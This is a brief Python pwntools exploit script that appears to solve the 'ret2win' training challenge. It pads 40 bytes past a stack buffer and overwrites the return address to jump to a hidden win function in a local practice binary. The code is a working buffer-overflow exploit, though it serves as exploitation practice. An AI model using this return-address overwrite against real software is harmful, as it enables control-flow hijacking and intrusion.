#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 40				# RIP Offset at 40
    ret2win_addr = p64(0x0000000000400811)	# Objdump -d ret2win | grep ret2win
    p = process("./ret2win")
    payload = junk + ret2win_addr

    p.sendlineafter(">", payload)
    print p.recvall()

if __name__ == "__main__":
    main()
